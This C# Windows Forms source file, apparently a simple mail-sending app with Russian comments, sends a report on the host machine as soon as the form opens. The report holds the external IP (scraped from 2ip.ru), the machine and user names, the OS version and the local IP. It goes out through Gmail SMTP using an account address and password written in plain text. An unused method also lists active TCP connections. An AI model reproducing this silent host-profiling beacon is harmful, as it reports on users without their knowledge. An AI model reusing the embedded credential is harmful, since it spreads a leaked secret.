using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;

namespace sendMail
{
    public partial class Form1 : Form
    {
        string file = ""; //путь к файлу вложиния
        
        public Form1()
        {
            InitializeComponent();
            button1.LostFocus+=new EventHandler(button1_LostFocus);
            send();
        }
  
        public void  send()
    {
            SmtpClient smtp = new SmtpClient ("smtp.gmail.com",25);
            smtp.UseDefaultCredentials = false;
            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtp.EnableSsl = true;
            smtp.Credentials = new NetworkCredential ("fargutvest@gmail.com", "371988343");
            MailMessage message = new MailMessage ();
            message.From = new MailAddress("fargutvest@gmail.com"); //адрес отправителя
            message.To.Add(new MailAddress(textBox3.Text)); //адреса получателя
            message.Subject = textBox2.Text; //тема письма
            string [] pcinfo = get_pcinfo();
            message.Body = get_my_ip() + "\r\n" + pcinfo[0]+"\r\n"+ pcinfo[1]+"\r\n"+pcinfo[2]+"\r\n"+pcinfo[3] ;  //текст письма
           
            //вложение в письмо
            if (file != "")
            {
                Attachment data = new Attachment(file);
                message.Attachments.Add(data);
            }

            smtp.SendAsync(message,null);
       smtp.SendCompleted+=new SendCompletedEventHandler(smtp_SendCompleted);
    }

        private void smtp_SendCompleted(object sender, EventArgs e)
        {
            button1.BackColor = Color.LightGreen;
            button1.Text = "отправлено";
            button1.Focus();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog  ofd = new OpenFileDialog ();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                file = ofd.FileName;
            }

 
        }

        private void button1_LostFocus(object sender, EventArgs e) 
        {
            button1.BackColor = System.Drawing.SystemColors.Control;
            button1.Text = "отправить";
            
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            textBox1.Focus();
        }

        // получение внешнего ip адреса через сайт 2ip.ru
        private string get_my_ip()
        {
            WebClient WebClient1 = new WebClient();
            WebClient1.Encoding = System.Text.Encoding.UTF8;
            string text_ip = WebClient1.DownloadString("http://2ip.ru");
            text_ip =  text_ip.Substring(text_ip.IndexOf("Ваш IP адрес:"), 500);
            text_ip = text_ip.Substring(text_ip.IndexOf("<big id="), text_ip.IndexOf("</big>") - text_ip.IndexOf("<big id="));
            text_ip ="Внешний_IP: " + text_ip.Substring(text_ip.IndexOf(">")+1);
            return text_ip;
        }

        //получение информации о компьютере
        private string[] get_pcinfo()
        {
            string [] info = new string[10];
            info[0] = "Pc_name: "+ Environment.MachineName;
            info[1] = "User_name: "+ SystemInformation.UserName;
            info[2] = "OS_version: " +Environment.OSVersion.VersionString;
            info[3] = "Локальный IP: "+System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName()).AddressList[0].ToString();
            
            
            return info;
        }
       
        //получение списка активных tcp соединений
        private void get_tcp_connect_active()
        {
            System.Net.NetworkInformation.IPGlobalProperties  IPG = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties();
            System.Net.NetworkInformation.TcpConnectionInformation[] con = IPG.GetActiveTcpConnections();

            foreach (System.Net.NetworkInformation.TcpConnectionInformation tcp in con)
            {
                StringBuilder sb = new StringBuilder();
	            sb.Append(tcp.LocalEndPoint.Address.ToString());
	            sb.Append("; "+tcp.RemoteEndPoint.Address.ToString());
	            sb.Append("; "+ tcp.State.ToString()+"\n");
                textBox1.AppendText(Convert.ToString(sb));
            }
        }
    
    }
}
